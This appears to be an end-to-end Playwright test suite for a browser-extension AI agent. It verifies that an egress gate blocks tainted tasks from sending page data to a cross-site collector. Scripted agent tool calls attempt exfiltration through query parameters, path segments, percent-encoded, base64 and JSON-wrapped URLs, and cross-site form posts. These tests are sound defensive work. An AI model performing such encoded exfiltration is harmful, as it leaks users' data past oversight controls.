/**
 * TEST-E2E-007 — data egress control in real Chromium (B2 step 11).
 *
 * Unit tests establish what the gate decides. These establish what the browser
 * actually did, which is a different claim: a blocked transfer must produce
 * zero requests at the destination, observed by the destination itself rather
 * than inferred from the extension's own report.
 */
import type { BrowserContext, Page, Worker } from '@playwright/test';
import { connectProvider, expect, test, waitForTask } from './fixtures/extension';

/**
 * Terminates the worker the way Chrome's eviction does, leaving the extension
 * installed and its storage intact. Same mechanism as `mv3-lifecycle`.
 */
async function killServiceWorker(context: BrowserContext, worker: Worker): Promise<void> {
  const cdp = await context.browser()!.newBrowserCDPSession();
  const { targetInfos } = await cdp.send('Target.getTargets');
  const target = targetInfos.find(
    (info) => info.type === 'service_worker' && info.url === worker.url(),
  );
  if (!target) throw new Error('No service worker target to terminate.');
  await cdp.send('Target.closeTarget', { targetId: target.targetId });
  await cdp.detach();
  await new Promise((r) => setTimeout(r, 800));
}

async function openPanel(context: BrowserContext, extensionId: string): Promise<Page> {
  const panel = await context.newPage();
  await panel.goto(`chrome-extension://${extensionId}/src/sidepanel/index.html`);
  await panel.waitForSelector('.app', { timeout: 15_000 });
  await new Promise((r) => setTimeout(r, 1200));
  return panel;
}

async function ask<T>(panel: Page, type: string, payload: unknown = {}): Promise<T> {
  const envelope: { ok: boolean; value?: unknown; error?: { userMessage?: string } } =
    await panel.evaluate(
      ([messageType, messagePayload]) =>
        chrome.runtime.sendMessage({
          id: `e2e_${Math.random().toString(36).slice(2)}`,
          type: messageType,
          timestamp: Date.now(),
          payload: messagePayload,
        }),
      [type, payload] as const,
    );
  if (!envelope?.ok) throw new Error(`${type} failed: ${envelope?.error?.userMessage ?? ''}`);
  return envelope.value as T;
}

/**
 * Answers the pending permission prompt, as the side panel's UI would.
 *
 * Polls because the prompt appears only once the gate has decided the
 * transfer needs one. Returns the prompt so a test can assert on its wording.
 */
async function answerPrompt(
  send: (type: 'permission.listPending' | 'permission.respond', payload: unknown) => Promise<never>,
  kind: 'approve_once' | 'deny',
): Promise<{ tool: string; reason: string }> {
  for (let attempt = 0; attempt < 100; attempt += 1) {
    const { requests } = (await send('permission.listPending', {})) as unknown as {
      requests: { id: string; tool: string; reason: string }[];
    };
    const pending = requests[0];
    if (pending) {
      await send('permission.respond', { requestId: pending.id, response: { kind } });
      return { tool: pending.tool, reason: pending.reason };
    }
    await new Promise((r) => setTimeout(r, 100));
  }
  throw new Error('No permission prompt appeared; the transfer was not gated.');
}

test('a clean task may navigate to another origin', async ({
  context,
  send,
  provider,
  site,
  collector,
}) => {
  const page = await context.newPage();
  await page.goto(site.baseUrl, { waitUntil: 'domcontentloaded' });
  await page.bringToFront();

  await connectProvider(send, provider);
  provider.script([
    {
      kind: 'tool_calls',
      calls: [{ name: 'browser_navigate', arguments: { url: `${collector.baseUrl}/landing` } }],
    },
    { kind: 'text', text: 'Navigated.' },
  ]);

  const { task } = await send('task.create', { objective: 'Open the other site.' });
  const finished = await waitForTask(send, task.id);

  expect(finished.state).toBe('COMPLETED');
  // Nothing sensitive had been read, so this is an ordinary navigation and it
  // really happened — the control is not simply blocking everything.
  expect(collector.hitsContaining('/landing').length).toBeGreaterThan(0);
});

test('a tainted query parameter never reaches the destination', async ({
  context,
  send,
  provider,
  site,
  collector,
}) => {
  const page = await context.newPage();
  await page.goto(site.baseUrl, { waitUntil: 'domcontentloaded' });
  await page.bringToFront();

  await connectProvider(send, provider);
  provider.script([
    // Read first, so the task holds page-derived data.
    { kind: 'tool_calls', calls: [{ name: 'browser_read_page', arguments: {} }] },
    {
      kind: 'tool_calls',
      calls: [
        {
          name: 'browser_navigate',
          arguments: { url: `${collector.baseUrl}/collect?stolen=widget-catalogue-contents` },
        },
      ],
    },
    { kind: 'text', text: 'Done.' },
  ]);

  const { task } = await send('task.create', { objective: 'Read the page, then navigate.' });

  // The transfer is held for a decision rather than performed and reported.
  const prompt = await answerPrompt(send as never, 'deny');
  expect(prompt.tool).toBe('browser.navigate');
  // Nothing had reached the destination while the prompt was open.
  expect(collector.requests).toHaveLength(0);

  const finished = await waitForTask(send, task.id);
  expect(finished.result?.blockedActions.join(' ')).toContain('browser.navigate');

  // And the destination still saw nothing. This is the assertion that
  // matters: a request sent and then discarded would leave a hit here.
  expect(collector.requests).toHaveLength(0);
  expect(collector.hitsContaining('stolen')).toHaveLength(0);
});

test('a same-site form submission really posts, even after the page was read', async ({
  context,
  send,
  provider,
  site,
  collector,
}) => {
  // The positive control for form egress. Without it, a suite that blocks
  // everything would look identical to one that works.
  //
  // The task reads the page first because element handles come from that
  // snapshot, so it is tainted by the time it submits. Same-site, so the
  // origin already holds what is being written back and the gate allows it.
  const page = await context.newPage();
  await page.goto(`${site.baseUrl}/same-site-form`, { waitUntil: 'domcontentloaded' });
  await page.bringToFront();

  await connectProvider(send, provider);
  provider.script([
    { kind: 'tool_calls', calls: [{ name: 'browser_read_page', arguments: {} }] },
    {
      kind: 'tool_calls',
      calls: [
        {
          name: 'browser_type',
          arguments: { elementId: 'e1-0', text: 'all good', submit: true },
        },
      ],
    },
    { kind: 'text', text: 'Sent.' },
  ]);

  const { task } = await send('task.create', { objective: 'Send feedback.' });
  // Submitting a form is R2, so the risk layer asks regardless of egress.
  // Approving here is what makes this a control: the post is allowed to
  // happen, and it does.
  const prompt = await answerPrompt(send as never, 'approve_once');
  expect(prompt.tool).toBe('browser.type');
  const finished = await waitForTask(send, task.id);

  expect(finished.state).toBe('COMPLETED');
  await page.waitForURL(/collect-local/, { timeout: 10_000 });
  // It went to the site's own origin, not to the collector.
  expect(collector.requests).toHaveLength(0);
});

test('a tainted cross-site form submission never posts', async ({
  context,
  send,
  provider,
  site,
  collector,
}) => {
  // A genuine POST with a real body, not a navigation standing in for one.
  const page = await context.newPage();
  await page.goto(`${site.baseUrl}/cross-site-form`, { waitUntil: 'domcontentloaded' });
  await page.bringToFront();

  await connectProvider(send, provider);
  provider.script([
    { kind: 'tool_calls', calls: [{ name: 'browser_read_page', arguments: {} }] },
    {
      kind: 'tool_calls',
      calls: [
        {
          name: 'browser_type',
          arguments: { elementId: 'e1-0', text: 'widget-catalogue-contents', submit: true },
        },
      ],
    },
    { kind: 'text', text: 'Done.' },
  ]);

  const { task } = await send('task.create', { objective: 'Read, then share.' });
  const prompt = await answerPrompt(send as never, 'deny');
  expect(prompt.tool).toBe('browser.type');
  await waitForTask(send, task.id);

  // No POST arrived, with no body and no parameters, because none was sent.
  expect(collector.requests).toHaveLength(0);
  expect(collector.requests.filter((r) => r.method === 'POST')).toHaveLength(0);
  expect(collector.hitsContaining('widget-catalogue')).toHaveLength(0);
});

test('a click following a link the page itself supplied is allowed', async ({
  context,
  send,
  provider,
  site,
  collector,
}) => {
  // Recorded as permitted by design, not as an oversight. A click follows a
  // URL the page supplied; the model did not compose it, so it carries
  // nothing the task read. Blocking it would stop ordinary browsing while
  // preventing no transfer — the model-composed URL is the case that is
  // blocked, and the tainted-query test above covers it.
  const page = await context.newPage();
  await page.goto(`${site.baseUrl}/cross-site-form`, { waitUntil: 'domcontentloaded' });
  await page.bringToFront();

  await connectProvider(send, provider);
  provider.script([
    { kind: 'tool_calls', calls: [{ name: 'browser_read_page', arguments: {} }] },
    { kind: 'tool_calls', calls: [{ name: 'browser_click', arguments: { elementId: 'e1-2' } }] },
    { kind: 'text', text: 'Followed.' },
  ]);

  const { task } = await send('task.create', { objective: 'Read, then follow the link.' });
  const finished = await waitForTask(send, task.id);
  expect(finished.state).toBe('COMPLETED');

  await new Promise((r) => setTimeout(r, 500));
  // The link's own path arrived. Nothing the task read went with it: the URL
  // is exactly what the page published.
  expect(collector.hitsContaining('widget-catalogue')).toHaveLength(0);
});

test('a blocked provider request reaches no provider, and no retry does either', async ({
  context,
  serviceWorker,
  extensionId,
  send,
  provider,
  site,
  collector,
}) => {
  // The provider's own request log is the independent receiving side here.
  const page = await context.newPage();
  await page.goto(site.baseUrl, { waitUntil: 'domcontentloaded' });
  await page.bringToFront();

  await connectProvider(send, provider);
  provider.script([
    { kind: 'tool_calls', calls: [{ name: 'browser_read_page', arguments: {} }] },
    { kind: 'text', text: 'Read it.' },
  ]);

  const first = await send('task.create', { objective: 'Read the page.' });
  await waitForTask(send, first.task.id);

  // Damage the stored provenance, then restart so the task is resumed with a
  // security context that cannot be established.
  await serviceWorker.evaluate(async (taskId) => {
    const key = `tasks:task:${taskId}`;
    const stored = await chrome.storage.local.get(key);
    const record = stored[key] as { taintState: unknown; state: string; finishedAt?: number };
    record.taintState = { kind: 'CORRUPT' };
    record.state = 'RUNNING';
    delete record.finishedAt;
    await chrome.storage.local.set({ [key]: record });
  }, first.task.id);

  await killServiceWorker(context, serviceWorker);
  const panel = await openPanel(context, extensionId);

  const before = provider.requests.length;
  provider.script([{ kind: 'text', text: 'should never be asked' }]);

  const resumed = await ask<{ task: { id: string; state: string } }>(panel, 'task.get', {
    taskId: first.task.id,
  });
  expect(resumed.task.state).toBe('PAUSED');

  // Give any retry loop time to run. The count must not move: a denial that
  // still emitted the request, or a retry that skipped the gate, would show.
  await new Promise((r) => setTimeout(r, 1500));
  expect(provider.requests.length).toBe(before);
  expect(collector.requests).toHaveLength(0);
});

test('an alternate network primitive in the worker reaches nothing', async ({
  serviceWorker,
  collector,
}) => {
  // Defence in depth, verified in the real worker rather than asserted.
  const results = await serviceWorker.evaluate(async (base) => {
    const outcome: Record<string, string> = {};
    for (const name of ['XMLHttpRequest', 'WebSocket', 'EventSource'] as const) {
      try {
        const Ctor = (self as unknown as Record<string, new (u: string) => unknown>)[name];
        if (!Ctor) {
          outcome[name] = 'absent';
          continue;
        }
        new Ctor(`${base}/via-${name}`);
        outcome[name] = 'constructed';
      } catch {
        outcome[name] = 'refused';
      }
    }
    try {
      await fetch(`${base}/via-fetch`);
      outcome.fetch = 'sent';
    } catch {
      outcome.fetch = 'refused';
    }
    return outcome;
  }, collector.baseUrl);

  expect(results.fetch).toBe('refused');
  for (const name of ['XMLHttpRequest', 'WebSocket', 'EventSource']) {
    expect(['refused', 'absent']).toContain(results[name]);
  }

  await new Promise((r) => setTimeout(r, 500));
  expect(collector.requests).toHaveLength(0);
});

test('taint survives a real worker restart, so the refusal survives with it', async ({
  context,
  serviceWorker,
  extensionId,
  send,
  provider,
  site,
  collector,
}) => {
  const page = await context.newPage();
  await page.goto(site.baseUrl, { waitUntil: 'domcontentloaded' });
  await page.bringToFront();

  await connectProvider(send, provider);
  provider.script([
    { kind: 'tool_calls', calls: [{ name: 'browser_read_page', arguments: {} }] },
    { kind: 'text', text: 'Read it.' },
  ]);

  const { task } = await send('task.create', { objective: 'Read the page.' });
  await waitForTask(send, task.id);

  // The record must carry what the task read, not just the runtime.
  const before = await send('task.get', { taskId: task.id });
  expect(before.task?.taintState.kind).toBe('TAINTED');

  await killServiceWorker(context, serviceWorker);
  const panel = await openPanel(context, extensionId);

  const after = await ask<{ task: { taintState: { kind: string } } }>(panel, 'task.get', {
    taskId: task.id,
  });
  // Before B2 this came back empty, and a resumed task evaluated as though it
  // had read nothing — a restart made the agent less restricted, not more.
  expect(after.task.taintState.kind).toBe('TAINTED');
  expect(collector.requests).toHaveLength(0);
});

test('an egress decision is recorded without the payload it describes', async ({
  context,
  send,
  provider,
  site,
}) => {
  const page = await context.newPage();
  await page.goto(site.baseUrl, { waitUntil: 'domcontentloaded' });
  await page.bringToFront();

  await connectProvider(send, provider);
  provider.script([
    { kind: 'tool_calls', calls: [{ name: 'browser_read_page', arguments: {} }] },
    { kind: 'text', text: 'Read it.' },
  ]);

  const { task } = await send('task.create', { objective: 'Read the page.' });
  await waitForTask(send, task.id);

  const { evidence } = await send('evidence.listForTask', { taskId: task.id });
  const decisions = evidence.filter((item) => item.type === 'EGRESS_DECISION');
  expect(decisions.length).toBeGreaterThan(0);

  const payload = await send('evidence.getPayload', { evidenceId: decisions[0]!.id });
  expect(payload.content).not.toBeNull();
  const detail = JSON.parse(payload.content!) as {
    payloadDigest?: string;
    summary: string;
    destinationIdentity: string;
    verdict: string;
  };

  // Enough to audit the decision...
  expect(detail.destinationIdentity).toContain('openai-compatible@');
  expect(detail.verdict).toBe('allow');
  expect(detail.payloadDigest).toMatch(/^[0-9a-f]{64}$/);

  // ...and none of what was sent. The summary is drawn from a fixed
  // vocabulary, so it cannot quote the body even accidentally.
  expect(detail.summary).toMatch(/^(no payload|text, \d+ characters|a record with \d+ fields)$/);
  expect(payload.content).not.toContain('Widget Catalogue');
  expect(payload.content).not.toContain('hunter2');
});

test('the password on the page never reaches the provider or the collector', async ({
  context,
  send,
  provider,
  site,
  collector,
}) => {
  const page = await context.newPage();
  await page.goto(site.baseUrl, { waitUntil: 'domcontentloaded' });
  await page.bringToFront();

  await connectProvider(send, provider);
  provider.script([
    { kind: 'tool_calls', calls: [{ name: 'browser_read_page', arguments: {} }] },
    { kind: 'text', text: 'Read it.' },
  ]);

  const { task } = await send('task.create', { objective: 'Read the page.' });
  await waitForTask(send, task.id);

  const bodies = JSON.stringify(provider.requests);
  expect(bodies).not.toContain('hunter2-do-not-leak');
  expect(collector.hitsContaining('hunter2')).toHaveLength(0);
});

/**
 * The remaining navigation shapes, each driven through the real browser.
 *
 * Parameterised because the assertion is identical and the interesting part
 * is the URL: whatever the model composes, a tainted task must not be able to
 * put task-derived text into a cross-site request. The collector is the
 * witness in every case.
 */
const BLOCKED_NAVIGATIONS: { label: string; path: (base: string) => string; marker: string }[] = [
  {
    label: 'a tainted path segment',
    path: (base) => `${base}/exfil/widget-catalogue-contents`,
    marker: 'widget-catalogue-contents',
  },
  {
    label: 'a mixed clean and tainted URL',
    path: (base) => `${base}/articles/12?note=widget-catalogue-contents`,
    marker: 'widget-catalogue-contents',
  },
  {
    label: 'a percent-encoded tainted value',
    path: (base) => `${base}/collect?q=%77%69%64%67%65%74%2d%63%61%74%61%6c%6f%67%75%65`,
    marker: '%77%69%64%67%65%74',
  },
  {
    label: 'a base64-wrapped tainted value',
    path: (base) => `${base}/collect?d=${Buffer.from('widget-catalogue').toString('base64')}`,
    marker: 'd=',
  },
  {
    label: 'a JSON-wrapped tainted value',
    path: (base) =>
      `${base}/collect?p=${encodeURIComponent(JSON.stringify({ leak: 'widget-catalogue' }))}`,
    marker: 'leak',
  },
];

for (const scenario of BLOCKED_NAVIGATIONS) {
  test(`${scenario.label} never reaches the destination`, async ({
    context,
    send,
    provider,
    site,
    collector,
  }) => {
    const page = await context.newPage();
    await page.goto(site.baseUrl, { waitUntil: 'domcontentloaded' });
    await page.bringToFront();

    await connectProvider(send, provider);
    provider.script([
      { kind: 'tool_calls', calls: [{ name: 'browser_read_page', arguments: {} }] },
      {
        kind: 'tool_calls',
        calls: [{ name: 'browser_navigate', arguments: { url: scenario.path(collector.baseUrl) } }],
      },
      { kind: 'text', text: 'Done.' },
    ]);

    const { task } = await send('task.create', { objective: 'Read, then navigate.' });
    await answerPrompt(send as never, 'deny');
    await waitForTask(send, task.id);

    expect(collector.requests).toHaveLength(0);
    expect(collector.hitsContaining(scenario.marker)).toHaveLength(0);
  });
}

test('an approved transfer is not reusable after the task reads something new', async ({
  context,
  send,
  provider,
  site,
  collector,
}) => {
  // Consent revocation by taint growth, end to end. The first transfer is
  // approved and really happens; the second, after another read, is asked
  // about again rather than riding the first approval.
  const page = await context.newPage();
  await page.goto(site.baseUrl, { waitUntil: 'domcontentloaded' });
  await page.bringToFront();

  await connectProvider(send, provider);
  provider.script([
    { kind: 'tool_calls', calls: [{ name: 'browser_read_page', arguments: {} }] },
    {
      kind: 'tool_calls',
      calls: [{ name: 'browser_navigate', arguments: { url: `${collector.baseUrl}/first?a=1` } }],
    },
    { kind: 'tool_calls', calls: [{ name: 'browser_read_page', arguments: {} }] },
    {
      kind: 'tool_calls',
      calls: [{ name: 'browser_navigate', arguments: { url: `${collector.baseUrl}/second?a=1` } }],
    },
    { kind: 'text', text: 'Done.' },
  ]);

  const { task } = await send('task.create', { objective: 'Read, go, read, go.' });

  const first = await answerPrompt(send as never, 'approve_once');
  expect(first.tool).toBe('browser.navigate');

  // A second prompt appearing at all is the property under test: the grant
  // did not carry across the new read.
  const second = await answerPrompt(send as never, 'deny');
  expect(second.tool).toBe('browser.navigate');

  await waitForTask(send, task.id);

  expect(collector.hitsContaining('/first')).toHaveLength(1);
  expect(collector.hitsContaining('/second')).toHaveLength(0);
});
